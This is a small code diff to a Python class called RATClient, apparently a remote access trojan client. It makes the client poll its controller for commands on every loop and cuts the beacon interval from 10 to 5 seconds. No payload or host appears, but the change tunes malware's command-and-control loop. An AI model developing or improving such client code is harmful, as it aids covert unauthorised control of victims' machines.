@@ -357,12 +357,12 @@ class RATClient:
                     self.registered = False
                     self.register()
                 
-                if command_poll_count % 3 == 0:
-                    self.poll_commands()
+                # Poll commands more frequently (every check instead of every 3rd)
+                self.poll_commands()
                     
                 heartbeat_count += 1
                 command_poll_count += 1
-                time.sleep(10)  # Check every 10 seconds
+                time.sleep(5)  # Check every 5 seconds for faster response
                 
             except KeyboardInterrupt:
                 print("\n[!] Client stopped by user")
